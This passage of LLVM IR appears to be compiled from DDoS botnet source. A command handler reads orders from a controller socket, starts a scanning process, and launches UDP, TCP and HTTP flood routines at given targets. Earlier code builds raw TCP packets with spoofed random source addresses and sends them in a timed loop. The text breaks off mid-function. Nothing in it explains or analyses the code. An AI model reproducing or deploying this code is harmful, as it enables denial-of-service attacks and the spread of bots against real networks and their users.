  %235 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %234, i32 0, i32 6
  store i16 0, i16* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.0* %237 to %struct.anon.1*
  %239 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load i32, i32* %9, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %244

; <label>:242:                                    ; preds = %225
  %243 = call i32 @rand_cmwc()
  br label %249

; <label>:244:                                    ; preds = %225
  %245 = load i32, i32* %9, align 4
  %246 = trunc i32 %245 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #13
  %248 = zext i16 %247 to i32
  br label %249

; <label>:249:                                    ; preds = %244, %242
  %250 = phi i32 [ %243, %242 ], [ %248, %244 ]
  %251 = trunc i32 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon.0* %253 to %struct.anon.1*
  %255 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %254, i32 0, i32 1
  store i16 %251, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %258 = call zeroext i16 @tcpcsum(%struct.iphdr* %256, %struct.tcphdr* %257)
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 6
  store i16 %258, i16* %262, align 4
  %263 = bitcast i8* %73 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %272 = load i32, i32* %10, align 4
  %273 = add nsw i32 %271, %272
  store i32 %273, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %274

; <label>:274:                                    ; preds = %327, %326, %249
  br label %275

; <label>:275:                                    ; preds = %274
  %276 = load i32, i32* %17, align 4
  %277 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %278 = call i64 @sendto(i32 %276, i8* %73, i64 %71, i32 0, %struct.sockaddr* %277, i32 16)
  %279 = load i32, i32* %19, align 4
  %280 = call i32 @GetRandomIP(i32 %279)
  %281 = call i32 @htonl(i32 %280) #13
  %282 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 8
  store i32 %281, i32* %283, align 4
  %284 = call i32 @rand_cmwc()
  %285 = trunc i32 %284 to i16
  %286 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 3
  store i16 %285, i16* %287, align 4
  %288 = call i32 @rand_cmwc()
  %289 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.0* %290 to %struct.anon.1*
  %292 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %291, i32 0, i32 2
  store i32 %288, i32* %292, align 4
  %293 = call i32 @rand_cmwc()
  %294 = trunc i32 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.0* %296 to %struct.anon.1*
  %298 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %297, i32 0, i32 0
  store i16 %294, i16* %298, align 4
  %299 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = bitcast %union.anon.0* %300 to %struct.anon.1*
  %302 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %301, i32 0, i32 6
  store i16 0, i16* %302, align 4
  %303 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %305 = call zeroext i16 @tcpcsum(%struct.iphdr* %303, %struct.tcphdr* %304)
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 %305, i16* %309, align 4
  %310 = bitcast i8* %73 to i16*
  %311 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 2
  %313 = load i16, i16* %312, align 2
  %314 = zext i16 %313 to i32
  %315 = call zeroext i16 @csum(i16* %310, i32 %314)
  %316 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 7
  store i16 %315, i16* %317, align 2
  %318 = load i32, i32* %25, align 4
  %319 = load i32, i32* %15, align 4
  %320 = icmp eq i32 %318, %319
  br i1 %320, label %321, label %327

; <label>:321:                                    ; preds = %275
  %322 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %323 = load i32, i32* %24, align 4
  %324 = icmp sgt i32 %322, %323
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %321
  br label %330

; <label>:326:                                    ; preds = %321
  store i32 0, i32* %25, align 4
  br label %274

; <label>:327:                                    ; preds = %275
  %328 = load i32, i32* %25, align 4
  %329 = add i32 %328, 1
  store i32 %329, i32* %25, align 4
  br label %274

; <label>:330:                                    ; preds = %325
  %331 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %331)
  br label %332

; <label>:332:                                    ; preds = %330, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

; <label>:36:                                     ; preds = %2
  br label %521

; <label>:37:                                     ; preds = %2
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.396, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %81, label %43

; <label>:43:                                     ; preds = %37
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.397, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %56, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i32, i32* @scanPid, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49
  br label %521

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @scanPid, align 4
  %55 = call i32 @kill(i32 %54, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %56

; <label>:56:                                     ; preds = %53, %43
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.398, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* @scanPid, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  br label %521

; <label>:66:                                     ; preds = %62
  %67 = call i32 @fork() #2
  store i32 %67, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %521

; <label>:72:                                     ; preds = %66
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %521

; <label>:76:                                     ; preds = %72
  br label %77

; <label>:77:                                     ; preds = %76
  %78 = load i32, i32* %7, align 4
  %79 = load i32, i32* %6, align 4
  call void @StartTheLelz(i32 %78, i32 %79)
  call void @_exit(i32 0) #12
  unreachable

; <label>:80:                                     ; preds = %56
  br label %81

; <label>:81:                                     ; preds = %80, %37
  %82 = load i8**, i8*** %4, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.399, i32 0, i32 0)) #10
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %146, label %87

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* %3, align 4
  %89 = icmp slt i32 %88, 6
  br i1 %89, label %102, label %90

; <label>:90:                                     ; preds = %87
  %91 = load i8**, i8*** %4, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93) #10
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %102, label %96

; <label>:96:                                     ; preds = %90
  %97 = load i8**, i8*** %4, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 5
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @atoi(i8* %99) #10
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %96, %90, %87
  br label %521

; <label>:103:                                    ; preds = %96
  %104 = call i32 @listFork()
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %103
  br label %521

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* @HeliosCommSock, align 4
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 2
  %114 = load i8*, i8** %113, align 8
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 3
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @atoi(i8* %117) #10
  %119 = load i8**, i8*** %4, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 5
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @atoi(i8* %121) #10
  %123 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %108, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.400, i32 0, i32 0), i8* %111, i8* %114, i32 %118, i32 %122)
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  %134 = trunc i32 %133 to i16
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 4
  %137 = load i8*, i8** %136, align 8
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 5
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @atoi(i8* %140) #10
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 6
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @atoi(i8* %144) #10
  call void @sendHTTP(i8* %126, i8* %129, i16 zeroext %134, i8* %137, i32 %141, i32 %145)
  call void @exit(i32 0) #14
  unreachable

; <label>:146:                                    ; preds = %81
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 0
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @strcmp(i8* %149, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.401, i32 0, i32 0)) #10
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %295, label %152

; <label>:152:                                    ; preds = %146
  %153 = load i32, i32* %3, align 4
  %154 = icmp slt i32 %153, 6
  br i1 %154, label %206, label %155

; <label>:155:                                    ; preds = %152
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 3
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 @atoi(i8* %158) #10
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %206, label %161

; <label>:161:                                    ; preds = %155
  %162 = load i8**, i8*** %4, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 2
  %164 = load i8*, i8** %163, align 8
  %165 = call i32 @atoi(i8* %164) #10
  %166 = icmp eq i32 %165, -1
  br i1 %166, label %206, label %167

; <label>:167:                                    ; preds = %161
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 4
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #10
  %172 = icmp eq i32 %171, -1
  br i1 %172, label %206, label %173

; <label>:173:                                    ; preds = %167
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 5
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @atoi(i8* %176) #10
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %206, label %179

; <label>:179:                                    ; preds = %173
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 5
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #10
  %184 = icmp sgt i32 %183, 65536
  br i1 %184, label %206, label %185

; <label>:185:                                    ; preds = %179
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 5
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #10
  %190 = icmp sgt i32 %189, 65500
  br i1 %190, label %206, label %191

; <label>:191:                                    ; preds = %185
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 4
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  %196 = icmp sgt i32 %195, 32
  br i1 %196, label %206, label %197

; <label>:197:                                    ; preds = %191
  %198 = load i32, i32* %3, align 4
  %199 = icmp eq i32 %198, 7
  br i1 %199, label %200, label %207

; <label>:200:                                    ; preds = %197
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 6
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @atoi(i8* %203) #10
  %205 = icmp slt i32 %204, 1
  br i1 %205, label %206, label %207

; <label>:206:                                    ; preds = %200, %191, %185, %179, %173, %167, %161, %155, %152
  br label %521

; <label>:207:                                    ; preds = %200, %197
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 1
  %210 = load i8*, i8** %209, align 8
  store i8* %210, i8** %8, align 8
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 2
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  store i32 %214, i32* %9, align 4
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 3
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  store i32 %218, i32* %10, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 4
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* %221) #10
  store i32 %222, i32* %11, align 4
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 5
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #10
  store i32 %226, i32* %12, align 4
  %227 = load i32, i32* %3, align 4
  %228 = icmp sgt i32 %227, 6
  br i1 %228, label %229, label %234

; <label>:229:                                    ; preds = %207
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 6
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @atoi(i8* %232) #10
  br label %235

; <label>:234:                                    ; preds = %207
  br label %235

; <label>:235:                                    ; preds = %234, %229
  %236 = phi i32 [ %233, %229 ], [ 1000, %234 ]
  store i32 %236, i32* %13, align 4
  %237 = load i32, i32* %3, align 4
  %238 = icmp sgt i32 %237, 7
  br i1 %238, label %239, label %244

; <label>:239:                                    ; preds = %235
  %240 = load i8**, i8*** %4, align 8
  %241 = getelementptr inbounds i8*, i8** %240, i64 7
  %242 = load i8*, i8** %241, align 8
  %243 = call i32 @atoi(i8* %242) #10
  br label %245

; <label>:244:                                    ; preds = %235
  br label %245

; <label>:245:                                    ; preds = %244, %239
  %246 = phi i32 [ %243, %239 ], [ 1000000, %244 ]
  store i32 %246, i32* %14, align 4
  %247 = load i32, i32* %3, align 4
  %248 = icmp sgt i32 %247, 8
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %245
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 8
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #10
  br label %255

; <label>:254:                                    ; preds = %245
  br label %255

; <label>:255:                                    ; preds = %254, %249
  %256 = phi i32 [ %253, %249 ], [ 0, %254 ]
  store i32 %256, i32* %15, align 4
  %257 = load i8*, i8** %8, align 8
  %258 = call i8* @strstr(i8* %257, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %259 = icmp ne i8* %258, null
  br i1 %259, label %260, label %281

; <label>:260:                                    ; preds = %255
  %261 = load i8*, i8** %8, align 8
  %262 = call i8* @strtok(i8* %261, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %262, i8** %16, align 8
  br label %263

; <label>:263:                                    ; preds = %278, %260
  %264 = load i8*, i8** %16, align 8
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %280

; <label>:266:                                    ; preds = %263
  %267 = call i32 @listFork()
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %278, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i8*, i8** %16, align 8
  %271 = load i32, i32* %9, align 4
  %272 = load i32, i32* %10, align 4
  %273 = load i32, i32* %11, align 4
  %274 = load i32, i32* %12, align 4
  %275 = load i32, i32* %13, align 4
  %276 = load i32, i32* %14, align 4
  %277 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %270, i32 %271, i32 %272, i32 %273, i32 %274, i32 %275, i32 %276, i32 %277)
  call void @_exit(i32 0) #12
  unreachable

; <label>:278:                                    ; preds = %266
  %279 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %279, i8** %16, align 8
  br label %263

; <label>:280:                                    ; preds = %263
  br label %294

; <label>:281:                                    ; preds = %255
  %282 = call i32 @listFork()
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %293, label %284

; <label>:284:                                    ; preds = %281
  %285 = load i8*, i8** %8, align 8
  %286 = load i32, i32* %9, align 4
  %287 = load i32, i32* %10, align 4
  %288 = load i32, i32* %11, align 4
  %289 = load i32, i32* %12, align 4
  %290 = load i32, i32* %13, align 4
  %291 = load i32, i32* %14, align 4
  %292 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %285, i32 %286, i32 %287, i32 %288, i32 %289, i32 %290, i32 %291, i32 %292)
  call void @_exit(i32 0) #12
  unreachable

; <label>:293:                                    ; preds = %281
  br label %294

; <label>:294:                                    ; preds = %293, %280
  br label %521

; <label>:295:                                    ; preds = %146
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 0
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.402, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %422, label %301

; <label>:301:                                    ; preds = %295
  %302 = load i32, i32* %3, align 4
  %303 = icmp slt i32 %302, 6
  br i1 %303, label %346, label %304

; <label>:304:                                    ; preds = %301
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 3
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  %309 = icmp eq i32 %308, -1
  br i1 %309, label %346, label %310

; <label>:310:                                    ; preds = %304
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 2
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #10
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %346, label %316

; <label>:316:                                    ; preds = %310
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 4
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @atoi(i8* %319) #10
  %321 = icmp eq i32 %320, -1
  br i1 %321, label %346, label %322

; <label>:322:                                    ; preds = %316
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 4
  %325 = load i8*, i8** %324, align 8
  %326 = call i32 @atoi(i8* %325) #10
  %327 = icmp sgt i32 %326, 32
  br i1 %327, label %346, label %328

; <label>:328:                                    ; preds = %322
  %329 = load i32, i32* %3, align 4
  %330 = icmp sgt i32 %329, 6
  br i1 %330, label %331, label %337

; <label>:331:                                    ; preds = %328
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 6
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #10
  %336 = icmp slt i32 %335, 0
  br i1 %336, label %346, label %337

; <label>:337:                                    ; preds = %331, %328
  %338 = load i32, i32* %3, align 4
  %339 = icmp eq i32 %338, 8
  br i1 %339, label %340, label %347

; <label>:340:                                    ; preds = %337
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 7
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #10
  %345 = icmp slt i32 %344, 1
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %340, %331, %322, %316, %310, %304, %301
  br label %521

; <label>:347:                                    ; preds = %340, %337
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 1
  %350 = load i8*, i8** %349, align 8
  store i8* %350, i8** %17, align 8
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 2
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @atoi(i8* %353) #10
  store i32 %354, i32* %18, align 4
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 3
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #10
  store i32 %358, i32* %19, align 4
  %359 = load i8**, i8*** %4, align 8
  %360 = getelementptr inbounds i8*, i8** %359, i64 4
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @atoi(i8* %361) #10
  store i32 %362, i32* %20, align 4
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 5
  %365 = load i8*, i8** %364, align 8
  store i8* %365, i8** %21, align 8
  %366 = load i32, i32* %3, align 4
  %367 = icmp eq i32 %366, 8
  br i1 %367, label %368, label %373

; <label>:368:                                    ; preds = %347
  %369 = load i8**, i8*** %4, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 7
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @atoi(i8* %371) #10
  br label %374

; <label>:373:                                    ; preds = %347
  br label %374

; <label>:374:                                    ; preds = %373, %368
  %375 = phi i32 [ %372, %368 ], [ 10, %373 ]
  store i32 %375, i32* %22, align 4
  %376 = load i32, i32* %3, align 4
  %377 = icmp sgt i32 %376, 6
  br i1 %377, label %378, label %383

; <label>:378:                                    ; preds = %374
  %379 = load i8**, i8*** %4, align 8
  %380 = getelementptr inbounds i8*, i8** %379, i64 6
  %381 = load i8*, i8** %380, align 8
  %382 = call i32 @atoi(i8* %381) #10
  br label %384

; <label>:383:                                    ; preds = %374
  br label %384

; <label>:384:                                    ; preds = %383, %378
  %385 = phi i32 [ %382, %378 ], [ 0, %383 ]
  store i32 %385, i32* %23, align 4
  %386 = load i8*, i8** %17, align 8
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %388 = icmp ne i8* %387, null
  br i1 %388, label %389, label %409

; <label>:389:                                    ; preds = %384
  %390 = load i8*, i8** %17, align 8
  %391 = call i8* @strtok(i8* %390, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %391, i8** %24, align 8
  br label %392

; <label>:392:                                    ; preds = %406, %389
  %393 = load i8*, i8** %24, align 8
  %394 = icmp ne i8* %393, null
  br i1 %394, label %395, label %408

; <label>:395:                                    ; preds = %392
  %396 = call i32 @listFork()
  %397 = icmp ne i32 %396, 0
  br i1 %397, label %406, label %398

; <label>:398:                                    ; preds = %395
  %399 = load i8*, i8** %24, align 8
  %400 = load i32, i32* %18, align 4
  %401 = load i32, i32* %19, align 4
  %402 = load i32, i32* %20, align 4
  %403 = load i8*, i8** %21, align 8
  %404 = load i32, i32* %23, align 4
  %405 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %399, i32 %400, i32 %401, i32 %402, i8* %403, i32 %404, i32 %405)
  call void @_exit(i32 0) #12
  unreachable

; <label>:406:                                    ; preds = %395
  %407 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %407, i8** %24, align 8
  br label %392

; <label>:408:                                    ; preds = %392
  br label %421

; <label>:409:                                    ; preds = %384
  %410 = call i32 @listFork()
  %411 = icmp ne i32 %410, 0
  br i1 %411, label %420, label %412

; <label>:412:                                    ; preds = %409
  %413 = load i8*, i8** %17, align 8
  %414 = load i32, i32* %18, align 4
  %415 = load i32, i32* %19, align 4
  %416 = load i32, i32* %20, align 4
  %417 = load i8*, i8** %21, align 8
  %418 = load i32, i32* %23, align 4
  %419 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %413, i32 %414, i32 %415, i32 %416, i8* %417, i32 %418, i32 %419)
  call void @_exit(i32 0) #12
  unreachable

; <label>:420:                                    ; preds = %409
  br label %421

; <label>:421:                                    ; preds = %420, %408
  br label %422

; <label>:422:                                    ; preds = %421, %295
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 0
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @strcmp(i8* %425, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.403, i32 0, i32 0)) #10
  %427 = icmp ne i32 %426, 0
  br i1 %427, label %484, label %428

; <label>:428:                                    ; preds = %422
